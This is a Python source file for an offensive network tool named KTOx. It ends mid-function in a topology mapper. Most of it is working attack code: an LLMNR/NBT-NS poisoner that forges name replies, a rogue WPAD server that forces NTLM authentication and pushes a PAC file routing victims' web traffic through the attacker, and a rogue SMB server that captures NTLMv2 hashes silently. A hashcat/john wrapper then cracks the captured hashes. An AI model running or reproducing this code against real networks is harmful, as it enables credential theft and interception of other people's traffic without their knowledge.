#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# ktox_extended.py — KTOx Extended Engine v1.0
#
# Modules:
#   · LLMNR / WPAD Poisoner    — Windows name resolution hash capture
#   · Rogue SMB Server         — NTLMv2 hash harvester
#   · Hash Cracker Interface   — run hashcat/john against captured hashes
#   · Network Topology Mapper  — visual LAN map from scan data
#   · Report Generator         — full pentest report from session loot

import os, sys, re, time, json, struct, socket, threading, subprocess, logging
from datetime import datetime

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
    from scapy.layers.dns  import DNS, DNSQR, DNSRR
    from scapy.config import conf as sconf
    sconf.ipv6_enabled = False
except ImportError as e:
    print(f"ERROR: scapy — {e}"); sys.exit(1)

try:
    from rich.console import Console
    from rich.panel   import Panel
    from rich.table   import Table
    from rich.rule    import Rule
    from rich.prompt  import Prompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich         import box
    from rich.tree    import Tree
    from rich.columns import Columns
except ImportError:
    print("ERROR: pip3 install rich"); sys.exit(1)

console   = Console(highlight=False)
loot_dir  = "ktox_loot"
stop_flag = threading.Event()

C_BLOOD  = "#C0392B"
C_RUST   = "#922B21"
C_EMBER  = "#E74C3C"
C_STEEL  = "#717D7E"
C_ASH    = "#ABB2B9"
C_WHITE  = "#F2F3F4"
C_DIM    = "#566573"
C_ORANGE = "#CA6F1E"
C_YELLOW = "#D4AC0D"
C_GOOD   = "#1E8449"

def tag(t, c=C_BLOOD): return f"[{c}]{t}[/{c}]"
def section(t):
    console.print()
    console.print(Rule(f"[bold {C_BLOOD}] {t} [/bold {C_BLOOD}]", style=C_RUST))
    console.print()

def _loot(event, data):
    os.makedirs(loot_dir, exist_ok=True)
    path  = os.path.join(loot_dir, "extended.log")
    entry = {"ts": datetime.now().isoformat(), "event": event, "data": data}
    try:
        with open(path, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except: pass


# ══════════════════════════════════════════════════════════════════════════════
# ── LLMNR / WPAD POISONER ─────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class LLMNRPoisoner:
    """
    Poisons LLMNR (UDP/5355) and NBT-NS (UDP/137) queries.
    When Windows can't resolve a hostname via DNS it broadcasts
    LLMNR/NBT-NS — we respond claiming to be the target host.
    The victim then sends NTLMv2 authentication to us automatically.

    Works silently in background — no user interaction needed on victim.
    Most effective in Windows Active Directory environments.
    """

    NTLMSSP_SIG = b"NTLMSSP\x00"

    def __init__(self, iface, attacker_ip,
                 analyze_only=False,
                 target_names=None):
        self.iface        = iface
        self.attacker_ip  = attacker_ip
        self.analyze_only = analyze_only  # passive mode — don't respond
        self.target_names = target_names  # only respond to these hostnames
        self._thread_llmnr = None
        self._thread_nbns  = None
        self._captured     = []

    def _should_respond(self, name):
        if not self.target_names:
            return True
        return any(name.lower().startswith(t.lower())
                   for t in self.target_names)

    # ── LLMNR handler ──────────────────────────────────────────────────────
    def _handle_llmnr(self, pkt):
        if not pkt.haslayer(UDP): return
        if pkt[UDP].dport != 5355: return
        if not pkt.haslayer(DNS): return
        if pkt[DNS].qr != 0: return  # only queries

        try:
            qname = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
            src   = pkt[IP].src
            ts    = datetime.now().strftime("%H:%M:%S")

            console.print(
                f"  [{C_YELLOW}]LLMNR[/{C_YELLOW}]  "
                f"[{C_WHITE}]{src}[/{C_WHITE}] queries "
                f"[{C_EMBER}]{qname}[/{C_EMBER}]  "
                f"[{C_DIM}]{ts}[/{C_DIM}]"
            )
            _loot("LLMNR_QUERY", {"src": src, "name": qname})

            if self.analyze_only or not self._should_respond(qname):
                return

            # Forge LLMNR response pointing to us
            resp = (
                IP(dst=src, src=self.attacker_ip) /
                UDP(sport=5355, dport=pkt[UDP].sport) /
                DNS(
                    id=pkt[DNS].id, qr=1, aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=pkt[DNSQR].qname,
                        ttl=30,
                        rdata=self.attacker_ip
                    )
                )
            )
            send(resp, verbose=False, iface=self.iface)
            console.print(
                f"  [{C_BLOOD}]⚡ LLMNR POISONED[/{C_BLOOD}]  "
                f"[{C_WHITE}]{qname}[/{C_WHITE}] → "
                f"[{C_EMBER}]{self.attacker_ip}[/{C_EMBER}]"
            )
            _loot("LLMNR_POISONED", {
                "src": src, "name": qname,
                "redirected_to": self.attacker_ip
            })

        except Exception:
            pass

    # ── NBT-NS handler ─────────────────────────────────────────────────────
    def _handle_nbns(self, pkt):
        if not pkt.haslayer(UDP): return
        if pkt[UDP].dport != 137: return
        if not pkt.haslayer(Raw): return

        try:
            raw  = pkt[Raw].load
            src  = pkt[IP].src
            ts   = datetime.now().strftime("%H:%M:%S")

            # Decode NetBIOS name (15 chars, space-padded)
            if len(raw) < 13: return
            nb_name = raw[13:28].decode("utf-8", errors="ignore").strip()
            xid     = raw[:2]

            console.print(
                f"  [{C_YELLOW}]NBT-NS[/{C_YELLOW}]  "
                f"[{C_WHITE}]{src}[/{C_WHITE}] queries "
                f"[{C_EMBER}]{nb_name}[/{C_EMBER}]  "
                f"[{C_DIM}]{ts}[/{C_DIM}]"
            )
            _loot("NBNS_QUERY", {"src": src, "name": nb_name})

            if self.analyze_only or not self._should_respond(nb_name):
                return

            # Forge NBT-NS response
            attacker_bytes = socket.inet_aton(self.attacker_ip)
            resp = (
                IP(src=self.attacker_ip, dst=src) /
                UDP(sport=137, dport=pkt[UDP].sport) /
                Raw(load=(
                    xid +
                    b"\x85\x00"   # Flags: response, authoritative
                    b"\x00\x00"   # Questions
                    b"\x00\x01"   # Answers
                    b"\x00\x00"   # Authority
                    b"\x00\x00"   # Additional
                    + raw[12:]    # Repeat the question
                    + b"\x00\x20\x00\x01"  # Type NB, Class IN
                    + b"\x00\x00\x00\xa8"  # TTL 168s
                    + b"\x00\x06"          # RDLENGTH
                    + b"\x00\x00"          # Flags: B-node, unique
                    + attacker_bytes
                ))
            )
            send(resp, verbose=False, iface=self.iface)
            console.print(
                f"  [{C_BLOOD}]⚡ NBT-NS POISONED[/{C_BLOOD}]  "
                f"[{C_WHITE}]{nb_name}[/{C_WHITE}] → "
                f"[{C_EMBER}]{self.attacker_ip}[/{C_EMBER}]"
            )
            _loot("NBNS_POISONED", {
                "src": src, "name": nb_name,
                "redirected_to": self.attacker_ip
            })

        except Exception:
            pass

    def start(self):
        mode = "ANALYZE" if self.analyze_only else "POISON"
        console.print(
            f"  [{C_GOOD}]✔ LLMNR/NBT-NS Poisoner [{mode}] on {self.iface}[/{C_GOOD}]"
        )
        if self.analyze_only:
            console.print(
                f"  [{C_YELLOW}]Passive mode — logging queries, not responding[/{C_YELLOW}]"
            )
        if self.target_names:
            console.print(
                f"  [{C_STEEL}]Targeting: {', '.join(self.target_names)}[/{C_STEEL}]"
            )

        def _run_llmnr():
            sniff(
                iface=self.iface,
                filter="udp port 5355",
                prn=self._handle_llmnr,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )

        def _run_nbns():
            sniff(
                iface=self.iface,
                filter="udp port 137",
                prn=self._handle_nbns,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )

        self._thread_llmnr = threading.Thread(target=_run_llmnr, daemon=True)
        self._thread_nbns  = threading.Thread(target=_run_nbns,  daemon=True)
        self._thread_llmnr.start()
        self._thread_nbns.start()
        return self._thread_llmnr


class WPADPoisoner:
    """
    Rogue WPAD (Web Proxy Auto-Discovery) server.
    Serves a malicious PAC file that routes all victim HTTP traffic
    through the attacker. Highly effective — IE/Edge use WPAD by default.

    Also forces NTLM authentication on WPAD fetch — harvests hashes
    without any user interaction beyond opening a browser.
    """

    PAC_TEMPLATE = """function FindProxyForURL(url, host) {{
    if (dnsDomainIs(host, "localhost") || isPlainHostName(host) ||
        shExpMatch(host, "127.*") || isInNet(host, "10.0.0.0", "255.0.0.0")) {{
        return "DIRECT";
    }}
    return "PROXY {attacker_ip}:8080; DIRECT";
}}"""

    WPAD_HTML = b"""HTTP/1.1 401 Unauthorized\r
WWW-Authenticate: NTLM\r
Content-Length: 0\r
Connection: close\r
\r
"""

    def __init__(self, attacker_ip, port=80):
        self.attacker_ip = attacker_ip
        self.port        = port
        self._srv_sock   = None
        self._thread     = None

    def _handle_client(self, conn, addr):
        try:
            data = conn.recv(4096).decode("utf-8", errors="ignore")
            src  = addr[0]
            ts   = datetime.now().strftime("%H:%M:%S")

            is_wpad = "/wpad.dat" in data or "/wpad" in data.lower()
            auth_m  = re.search(
                r'Authorization:\s*NTLM\s+([A-Za-z0-9+/=]+)', data, re.I
            )

            if auth_m:
                import base64
                try:
                    blob    = base64.b64decode(auth_m.group(1))
                    sig_idx = blob.find(b"NTLMSSP\x00")
                    if sig_idx >= 0:
                        msg_type = struct.unpack_from("<I", blob, sig_idx + 8)[0]
                        if msg_type == 3:
                            # AUTHENTICATE — extract user/domain
                            b = blob[sig_idx:]
                            dom_len  = struct.unpack_from("<H", b, 28)[0]
                            dom_off  = struct.unpack_from("<I", b, 32)[0]
                            user_len = struct.unpack_from("<H", b, 36)[0]
                            user_off = struct.unpack_from("<I", b, 40)[0]
                            nt_len   = struct.unpack_from("<H", b, 20)[0]
                            nt_off   = struct.unpack_from("<I", b, 24)[0]

                            domain   = b[dom_off:dom_off+dom_len].decode("utf-16-le", errors="ignore")
                            username = b[user_off:user_off+user_len].decode("utf-16-le", errors="ignore")
                            nt_hash  = b[nt_off:nt_off+nt_len].hex()

                            console.print(
                                f"\n  [{C_BLOOD}]⚡ WPAD NTLM HASH[/{C_BLOOD}]\n"
                                f"  [{C_GOOD}]{domain}\\{username}[/{C_GOOD}]\n"
                                f"  [{C_DIM}]{nt_hash[:64]}...[/{C_DIM}]"
                            )
                            _loot("WPAD_NTLM", {
                                "src": src, "domain": domain,
                                "username": username, "nt_hash": nt_hash
                            })

                            # Save to ntlm_hashes.txt
                            os.makedirs(loot_dir, exist_ok=True)
                            with open(os.path.join(loot_dir, "ntlm_hashes.txt"), "a") as f:
                                f.write(f"{username}::{domain}::{nt_hash}\n")

                            # Now serve the PAC file
                            pac = self.PAC_TEMPLATE.format(
                                attacker_ip=self.attacker_ip
                            ).encode()
                            resp = (
                                b"HTTP/1.1 200 OK\r\n"
                                b"Content-Type: application/x-ns-proxy-autoconfig\r\n"
                                b"Content-Length: " + str(len(pac)).encode() + b"\r\n"
                                b"\r\n" + pac
                            )
                            conn.sendall(resp)
                            return
                except Exception:
                    pass

            if is_wpad:
                console.print(
                    f"  [{C_YELLOW}]WPAD[/{C_YELLOW}]  "
                    f"[{C_WHITE}]{src}[/{C_WHITE}] requesting PAC — "
                    f"[{C_EMBER}]sending NTLM challenge[/{C_EMBER}]  "
                    f"[{C_DIM}]{ts}[/{C_DIM}]"
                )
                _loot("WPAD_REQUEST", {"src": src})
                conn.sendall(self.WPAD_HTML)
            else:
                # Generic 404
                conn.sendall(
                    b"HTTP/1.1 404 Not Found\r\n"
                    b"Content-Length: 0\r\n\r\n"
                )
        except Exception:
            pass
        finally:
            try: conn.close()
            except: pass

    def start(self):
        console.print(
            f"  [{C_GOOD}]✔ WPAD Rogue Proxy on port {self.port}[/{C_GOOD}]"
        )
        console.print(
            f"  [{C_STEEL}]PAC URL: http://{self.attacker_ip}/wpad.dat[/{C_STEEL}]"
        )
        console.print(
            f"  [{C_DIM}]Forces NTLM auth on WPAD fetch — harvests hashes silently[/{C_DIM}]"
        )

        def _serve():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", self.port))
            srv.listen(50)
            srv.settimeout(1)
            self._srv_sock = srv
            while not stop_flag.is_set():
                try:
                    conn, addr = srv.accept()
                    threading.Thread(
                        target=self._handle_client,
                        args=(conn, addr), daemon=True
                    ).start()
                except socket.timeout: continue
                except: break
            srv.close()

        self._thread = threading.Thread(target=_serve, daemon=True)
        self._thread.start()
        return self._thread


# ══════════════════════════════════════════════════════════════════════════════
# ── ROGUE SMB SERVER ──────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class RogueSMBServer:
    """
    Minimal rogue SMB server that captures NTLMv2 authentication.
    When LLMNR/NBT-NS poisoning redirects a victim to us, their machine
    automatically tries to authenticate via SMB — we capture the hash.

    Implements just enough of SMB negotiate/session-setup to trigger
    NTLMSSP authentication and extract the hash from the response.
    """

    NTLMSSP_SIG       = b"NTLMSSP\x00"
    SMB_NEGOTIATE_REQ = b"\xffSMB"
    SMB2_MAGIC        = b"\xfeSMB"

    # SMB1 Negotiate Response — forces NTLMSSP
    SMB1_NEG_RESP = (
        b"\x00\x00\x00\x55"                     # NetBIOS length
        b"\xffSMBr"                              # SMB header
        b"\x00\x00\x00\x00"                      # NT Status OK
        b"\x88\x01\xc8\x00"                      # Flags
        b"\x00\x00\x00\x00\x00\x00"              # Signature
        b"\x00\x00"                              # Reserved
        b"\xff\xff"                              # TID
        b"\x00\x00"                              # PID
        b"\x00\x00"                              # UID
        b"\x01\x00"                              # MID
        b"\x11\x00"                              # Word count
        b"\x03\x00"                              # Dialect index (NTLM)
        b"\x00"                                  # Security mode
        b"\x01\x00"                              # Max MPX
        b"\x01\x00"                              # Max VCs
        b"\x00\x10\x00\x00"                      # Max buffer
        b"\x00\x00\x01\x00"                      # Max raw
        b"\x00\x00\x00\x00"                      # Session key
        b"\x40\x00\x00\x00"                      # Capabilities
        b"\x00\x00\x00\x00\x00\x00\x00\x00"      # System time
        b"\x00\x00"                              # Server time zone
        b"\x00"                                  # Key length
        b"\x00\x00"                              # Byte count
    )

    def __init__(self, attacker_ip, port=445):
        self.attacker_ip = attacker_ip
        self.port        = port
        self._thread     = None

    def _extract_ntlm_hash(self, data, src):
        """Extract NTLMv2 hash from AUTHENTICATE message."""
        try:
            sig_idx = data.find(self.NTLMSSP_SIG)
            if sig_idx < 0: return

            b        = data[sig_idx:]
            msg_type = struct.unpack_from("<I", b, 8)[0]
            if msg_type != 3: return

            dom_len  = struct.unpack_from("<H", b, 28)[0]
            dom_off  = struct.unpack_from("<I", b, 32)[0]
            user_len = struct.unpack_from("<H", b, 36)[0]
            user_off = struct.unpack_from("<I", b, 40)[0]
            nt_len   = struct.unpack_from("<H", b, 20)[0]
            nt_off   = struct.unpack_from("<I", b, 24)[0]
            ws_len   = struct.unpack_from("<H", b, 44)[0]
            ws_off   = struct.unpack_from("<I", b, 48)[0]

            domain    = b[dom_off:dom_off+dom_len].decode("utf-16-le", errors="ignore")
            username  = b[user_off:user_off+user_len].decode("utf-16-le", errors="ignore")
            workstat  = b[ws_off:ws_off+ws_len].decode("utf-16-le", errors="ignore")
            nt_resp   = b[nt_off:nt_off+nt_len]

            if nt_len >= 24:
                # NTLMv2: first 16 bytes = NT hash, rest = blob
                nt_hash = nt_resp[:16].hex()
                nt_blob = nt_resp[16:].hex()

                # Hashcat NTLMv2 format:
                # username::domain:ServerChallenge:NTProofStr:blob
                # We use a fixed challenge since we control the server
                challenge  = "1122334455667788"
                hashcat_str = (
                    f"{username}::{domain}:{challenge}:"
                    f"{nt_hash}:{nt_blob}"
                )

                console.print(
                    f"\n  [{C_BLOOD}]⚡ SMB NTLMv2 HASH CAPTURED[/{C_BLOOD}]\n"
                    f"  [{C_STEEL}]User:[/{C_STEEL}]      [{C_GOOD}]{domain}\\{username}[/{C_GOOD}]\n"
                    f"  [{C_STEEL}]Workstation:[/{C_STEEL}] [{C_ASH}]{workstat}[/{C_ASH}]\n"
                    f"  [{C_STEEL}]Source:[/{C_STEEL}]    [{C_DIM}]{src}[/{C_DIM}]\n"
                    f"  [{C_STEEL}]Hash:[/{C_STEEL}]      [{C_EMBER}]{nt_hash}[/{C_EMBER}]"
                )

                _loot("SMB_NTLM_HASH", {
                    "src": src, "domain": domain,
                    "username": username, "workstation": workstat,
                    "nt_hash": nt_hash, "hashcat": hashcat_str
                })

                # Save to hashcat file
                os.makedirs(loot_dir, exist_ok=True)
                hpath = os.path.join(loot_dir, "ntlm_hashes.txt")
                with open(hpath, "a") as f:
                    f.write(hashcat_str + "\n")

                console.print(
                    f"  [{C_DIM}]Saved → {hpath}[/{C_DIM}]\n"
                    f"  [{C_DIM}]Crack: hashcat -m 5600 {hpath} wordlist.txt[/{C_DIM}]"
                )

        except Exception:
            pass

    def _handle_client(self, conn, addr):
        src = addr[0]
        try:
            # Step 1: receive negotiate request
            data = conn.recv(4096)
            if not data: return

            # Step 2: send negotiate response
            conn.sendall(self.SMB1_NEG_RESP)

            # Step 3: receive session setup (contains NTLMSSP negotiate)
            data = conn.recv(4096)
            if not data: return

            # Step 4: send NTLMSSP challenge
            # Build a minimal SMB session setup response with our challenge
            challenge  = b"\x11\x22\x33\x44\x55\x66\x77\x88"
            ntlm_chall = (
                b"NTLMSSP\x00"        # Signature
                b"\x02\x00\x00\x00"  # Type 2 (challenge)
                b"\x00\x00"          # TargetName length
                b"\x00\x00"          # TargetName max
                b"\x38\x00\x00\x00"  # TargetName offset
                b"\x01\x02\x81\x00"  # Negotiate flags
                + challenge +        # Server challenge
                b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Reserved
            )

            smb_chall = (
                b"\x00\x00\x00\x7c"
                b"\xffSMBs"
                b"\x00\x00\x00\x00"
                b"\x88\x01\xc8\x00"
                b"\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\xff\xff\x00\x00\x00\x00\x40\x00"
                b"\x04\xff\x00\x00\x00\x00\x00"
                b"\x01\x00"
                b"\x00\x00"
                b"\x00\x00\x00\x00"
                b"\x60"  # Start of security blob (GSSAPI)
                + struct.pack("<H", len(ntlm_chall)) + ntlm_chall
            )
            conn.sendall(smb_chall)

            # Step 5: receive authenticate (contains NTLMv2 hash)
            data = conn.recv(8192)
            if data:
                self._extract_ntlm_hash(data, src)

        except Exception:
            pass
        finally:
            try: conn.close()
            except: pass

    def start(self):
        console.print(
            f"  [{C_GOOD}]✔ Rogue SMB Server on port {self.port}[/{C_GOOD}]"
        )
        console.print(
            f"  [{C_STEEL}]Waiting for NTLM authentication attempts...[/{C_STEEL}]"
        )
        console.print(
            f"  [{C_DIM}]Hashes → ktox_loot/ntlm_hashes.txt[/{C_DIM}]"
        )

        def _serve():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                srv.bind(("0.0.0.0", self.port))
            except PermissionError:
                console.print(
                    f"  [{C_ORANGE}]⚠  Port {self.port} in use — trying 4445[/{C_ORANGE}]"
                )
                self.port = 4445
                srv.bind(("0.0.0.0", self.port))
            srv.listen(50)
            srv.settimeout(1)
            while not stop_flag.is_set():
                try:
                    conn, addr = srv.accept()
                    threading.Thread(
                        target=self._handle_client,
                        args=(conn, addr), daemon=True
                    ).start()
                except socket.timeout: continue
                except: break
            srv.close()

        self._thread = threading.Thread(target=_serve, daemon=True)
        self._thread.start()
        return self._thread


# ══════════════════════════════════════════════════════════════════════════════
# ── HASH CRACKER INTERFACE ────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class HashCracker:
    """
    Interface to hashcat and john for cracking captured hashes.
    Supports NTLMv2, NTLM, MD5, SHA1, bcrypt.
    Shows progress live in terminal.
    """

    HASHCAT_MODES = {
        "ntlmv2":  "5600",
        "ntlm":    "1000",
        "md5":     "0",
        "sha1":    "100",
        "sha256":  "1400",
        "bcrypt":  "3200",
        "wpa2":    "22000",
    }

    def __init__(self):
        self._process = None

    def find_wordlists(self):
        """Locate common wordlists on the system."""
        candidates = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
            "/usr/share/metasploit-framework/data/wordlists/common_passwords.txt",
            "/opt/wordlists/rockyou.txt",
            os.path.expanduser("~/wordlists/rockyou.txt"),
            os.path.join(loot_dir, "wordlist.txt"),
        ]
        found = []
        for c in candidates:
            if os.path.exists(c):
                size = os.path.getsize(c)
                found.append((c, size))
        return found

    def find_hash_tools(self):
        """Check which cracking tools are available."""
        tools = {}
        for tool in ("hashcat", "john"):
            try:
                subprocess.run(
                    [tool, "--version"],
                    capture_output=True, timeout=3
                )
                tools[tool] = True
            except (FileNotFoundError, subprocess.TimeoutExpired):
                tools[tool] = False
        return tools

    def crack_ntlmv2(self, hash_file=None, wordlist=None, rules=None):
        """Crack NTLMv2 hashes with hashcat."""
        section("HASH CRACKER — NTLMv2")

        tools = self.find_hash_tools()
        wordlists = self.find_wordlists()

        # Show status
        table = Table(box=box.SIMPLE, border_style=C_RUST,
                      header_style=f"bold {C_BLOOD}", show_header=False)
        table.add_column("key",   style=C_STEEL, width=16)
        table.add_column("value", style=C_WHITE)

        table.add_row("hashcat",   "✔ found" if tools.get("hashcat") else "✖ not found")
        table.add_row("john",      "✔ found" if tools.get("john") else "✖ not found")

        if wordlists:
            for path, size in wordlists[:3]:
                table.add_row(
                    "wordlist",
                    f"{path} ({size // 1024 // 1024}MB)"
                )
        else:
            table.add_row("wordlist", "none found")

        console.print(table)

        # Hash file
        if not hash_file:
            default_path = os.path.join(loot_dir, "ntlm_hashes.txt")
            hash_file = Prompt.ask(
                f"  [{C_BLOOD}]Hash file[/{C_BLOOD}]",
                default=default_path
            )

        if not os.path.exists(hash_file):
            console.print(f"  [{C_ORANGE}]⚠  No hash file found at {hash_file}[/{C_ORANGE}]")
            console.print(f"  [{C_DIM}]Run LLMNR + Rogue SMB to capture hashes first.[/{C_DIM}]")
            return

        # Count hashes
        with open(hash_file) as f:
            lines = [l.strip() for l in f if l.strip()]
        console.print(f"  [{C_STEEL}]{len(lines)} hash(es) loaded.[/{C_STEEL}]")

        # Wordlist
        if not wordlist:
            if wordlists:
                wordlist = wordlists[0][0]
                console.print(
                    f"  [{C_DIM}]Using wordlist: {wordlist}[/{C_DIM}]"
                )
            else:
                wordlist = Prompt.ask(
                    f"  [{C_BLOOD}]Wordlist path[/{C_BLOOD}]"
                )

        if not os.path.exists(wordlist):
            console.print(f"  [{C_ORANGE}]⚠  Wordlist not found: {wordlist}[/{C_ORANGE}]")
            return

        # Choose tool
        tool = None
        if tools.get("hashcat"):
            tool = "hashcat"
        elif tools.get("john"):
            tool = "john"
        else:
            console.print(
                f"  [{C_ORANGE}]⚠  Neither hashcat nor john found.[/{C_ORANGE}]\n"
                f"  [{C_DIM}]Install: sudo apt install hashcat john[/{C_DIM}]"
            )
            return

        out_file = os.path.join(loot_dir, "cracked.txt")

        if tool == "hashcat":
            mode = self.HASHCAT_MODES["ntlmv2"]
            cmd = [
                "hashcat", "-m", mode,
                hash_file, wordlist,
                "--outfile", out_file,
                "--outfile-format", "2",
                "--force",
                "--quiet",
                "--status",
                "--status-timer", "5",
            ]
            if rules:
                cmd += ["--rules-file", rules]
        else:
            cmd = [
                "john",
                "--format=netntlmv2",
                f"--wordlist={wordlist}",
                hash_file
            ]

        console.print(Panel(
            f"  {tag('Tool:',     C_BLOOD)}      [{C_WHITE}]{tool}[/{C_WHITE}]\n"
            f"  {tag('Hashes:',   C_STEEL)}    [{C_ASH}]{hash_file}[/{C_ASH}]\n"
            f"  {tag('Wordlist:', C_STEEL)}   [{C_ASH}]{wordlist}[/{C_ASH}]\n"
            f"  {tag('Output:',   C_DIM)}     [{C_DIM}]{out_file}[/{C_DIM}]\n\n"
            f"  [{C_DIM}]Ctrl+C to stop cracking[/{C_DIM}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ CRACKING[/bold {C_BLOOD}]",
            padding=(1, 2)
        ))

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            self._process = proc

            for line in proc.stdout:
                line = line.strip()
                if not line: continue
                if "Recovered" in line or "cracked" in line.lower():
                    console.print(f"  [{C_GOOD}]✔ {line}[/{C_GOOD}]")
                elif "Status" in line or "Speed" in line or "Progress" in line:
                    console.print(f"  [{C_DIM}]{line}[/{C_DIM}]", end="\r")
                elif "ERROR" in line.upper() or "WARN" in line.upper():
                    console.print(f"  [{C_ORANGE}]{line}[/{C_ORANGE}]")

            proc.wait()

        except KeyboardInterrupt:
            if self._process:
                self._process.terminate()
            console.print(f"\n  [{C_ORANGE}]Cracking stopped.[/{C_ORANGE}]")

        # Show results
        if os.path.exists(out_file):
            with open(out_file) as f:
                cracked = [l.strip() for l in f if l.strip()]
            if cracked:
                section("CRACKED PASSWORDS")
                for line in cracked:
                    console.print(f"  [{C_EMBER}]⚡ {line}[/{C_EMBER}]")
                _loot("HASHES_CRACKED", {"count": len(cracked), "file": out_file})
            else:
                console.print(f"  [{C_DIM}]No passwords cracked with this wordlist.[/{C_DIM}]")
                console.print(
                    f"  [{C_STEEL}]Try a larger wordlist or add rules:[/{C_STEEL}]\n"
                    f"  [{C_DIM}]hashcat -m 5600 {hash_file} {wordlist} -r /usr/share/hashcat/rules/best64.rule[/{C_DIM}]"
                )

    def show_hash_menu(self):
        """Interactive hash cracker menu."""
        section("HASH CRACKER")

        console.print(Panel(
            f"  [{C_ASH}]Crack captured hashes from KTOx loot files.\\n"
            f"  Supports NTLMv2, NTLM, MD5, SHA1, bcrypt, WPA2.[/{C_ASH}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ HASH CRACKER[/bold {C_BLOOD}]",
            padding=(1, 2)
        ))

        hash_types = list(self.HASHCAT_MODES.keys())
        console.print(
            f"  [{C_STEEL}]Hash types: {', '.join(hash_types)}[/{C_STEEL}]"
        )

        htype = Prompt.ask(
            f"  [{C_BLOOD}]Hash type[/{C_BLOOD}]",
            default="ntlmv2"
        )

        if htype == "ntlmv2":
            self.crack_ntlmv2()
        else:
            hash_file = Prompt.ask(f"  [{C_BLOOD}]Hash file path[/{C_BLOOD}]")
            wordlist  = Prompt.ask(f"  [{C_BLOOD}]Wordlist path[/{C_BLOOD}]")

            if not os.path.exists(hash_file):
                console.print(f"  [{C_ORANGE}]File not found: {hash_file}[/{C_ORANGE}]")
                return

            mode = self.HASHCAT_MODES.get(htype, "0")
            out  = os.path.join(loot_dir, "cracked.txt")
            cmd  = [
                "hashcat", "-m", mode,
                hash_file, wordlist,
                "--outfile", out,
                "--force", "--quiet"
            ]
            console.print(
                f"  [{C_DIM}]Running: {' '.join(cmd)}[/{C_DIM}]"
            )
            try:
                subprocess.run(cmd)
            except FileNotFoundError:
                console.print(
                    f"  [{C_ORANGE}]hashcat not found. Install: sudo apt install hashcat[/{C_ORANGE}]"
                )
            except KeyboardInterrupt:
                console.print(f"\n  [{C_ORANGE}]Stopped.[/{C_ORANGE}]")


# ══════════════════════════════════════════════════════════════════════════════
# ── NETWORK TOPOLOGY MAPPER ───────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class TopologyMapper:
    """
    Builds a visual network topology map from scan data.
    Shows gateway, hosts, device types, open ports, and
    traffic relationships observed during the session.
    Exports to ASCII art, JSON, and HTML.
    """

    DEVICE_ICONS = {
        "Apple":          "🍎",
        "Raspberry Pi":   "🍓",
        "VMware":         "🖥",
        "VirtualBox":     "📦",
        "Microsoft":      "🪟",
        "Google":         "🔍",
        "Amazon":         "📦",
        "Cisco":          "🔌",
        "Netgear":        "📡",
        "TP-Link":        "📡",
        "Asus":           "💻",
        "Samsung":        "📱",
        "Ubiquiti":       "📡",
        "Unknown":        "❓",
        "Gateway":        "🌐",
    }

    OUI_MAP = {
        "B8:27:EB": "Raspberry Pi", "DC:A6:32": "Raspberry Pi",
        "00:50:56": "VMware",       "00:0C:29": "VMware",
        "08:00:27": "VirtualBox",   "00:15:5D": "Microsoft",
        "00:1A:11": "Google",       "74:44:01": "Amazon",
        "00:23:AE": "Cisco",        "00:18:E7": "TP-Link",
        "F4:F2:6D": "TP-Link",      "00:1A:2B": "Asus",
        "44:D9:E7": "Ubiquiti",     "00:1F:C6": "Samsung",
        "00:17:F2": "Apple",        "B8:78:2E": "Apple",
        "C0:3F:0E": "Netgear",      "20:4E:7F": "Netgear",
    }

    def __init__(self, hosts, gateway_ip, gateway_mac,
                 dns_queries=None, http_requests=None,
                 credentials=None):
        self.hosts         = hosts           # list of {ip, mac, vendor, hostname}
        self.gateway_ip    = gateway_ip
        self.gateway_mac   = gateway_mac
        self.dns_queries   = dns_queries or []
        self.http_requests = http_requests or []
        self.credentials   = credentials or []

    def _resolve_vendor(self, mac):
        if not mac: return "Unknown"
        prefix = mac.upper()[:8]
        return self.OUI_MAP.get(prefix, "Unknown")

    def _get_icon(self, vendor, is_gateway=False):
        if is_gateway: return self.DEVICE_ICONS["Gateway"]
        return self.DEVICE_ICONS.get(vendor, self.DEVICE_ICONS["Unknown"])

    def render_tree(self):
        """Render a Rich tree view of the network topology."""
        section("NETWORK TOPOLOGY MAP")

        root = Tree(
            f"[bold {C_BLOOD}]◈ LAN TOPOLOGY[/bold {C_BLOOD}]  "
            f"[{C_DIM}]{len(self.hosts)} host(s)[/{C_DIM}]"
        )

        # Gateway node
        gw_vendor = self._resolve_vendor(self.gateway_mac)
        gw_node = root.add(
            f"[bold {C_YELLOW}]🌐 GATEWAY[/bold {C_YELLOW}]  "
            f"[{C_WHITE}]{self.gateway_ip}[/{C_WHITE}]  "
            f"[{C_STEEL}]{self.gateway_mac}[/{C_STEEL}]  "
            f"[{C_DIM}]{gw_vendor}[/{C_DIM}]"
        )

        # Count traffic per host
        traffic = {}
        for req in self.http_requests:
            src = (req.get("data") or {}).get("src", "")
            traffic[src] = traffic.get(src, 0) + 1

        cred_srcs = set()
        for cred in self.credentials:
            src = (cred.get("data") or {}).get("src", "")
            if src: cred_srcs.add(src)

        for host in self.hosts:
            ip       = host.get("ip", "?")
            mac      = host.get("mac", "?")
